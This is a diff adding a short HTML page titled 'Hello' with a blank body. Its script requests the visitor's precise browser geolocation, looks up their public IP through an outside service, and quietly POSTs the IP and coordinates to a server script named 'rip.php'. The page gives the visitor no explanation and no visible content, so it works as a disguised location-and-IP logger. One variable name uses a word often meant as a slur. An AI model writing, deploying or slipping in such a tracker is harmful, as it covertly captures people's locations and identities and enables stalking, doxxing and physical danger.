@@ -1,0 +1,32 @@
+<html><head>
+<title>Hello</title>
+<script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+
+<script type="application/javascript">
+$(function() {
+
+if (navigator.geolocation) {
+
+var gay = {
+enableHighAccuracy : true,
+timeout : Infinity,
+maximumAge : 0 };
+
+navigator.geolocation.getCurrentPosition(bienvu, nope, gay); }
+
+function nope(ahah) {}
+function bienvu(position) {
+$.getJSON("https://api.ipify.org?format=jsonp&callback=?",
+function(json) {
+$.ajax({
+url : 'rip.php',
+type : 'POST',
+data : 'ip=' + json.ip + '&latitude=' + position.coords.latitude + '&longitude=' + position.coords.longitude,
+dataType : 'html' }); } ); }
+
+});
+</script>
+
+</head>
+<body></body>
+</html>
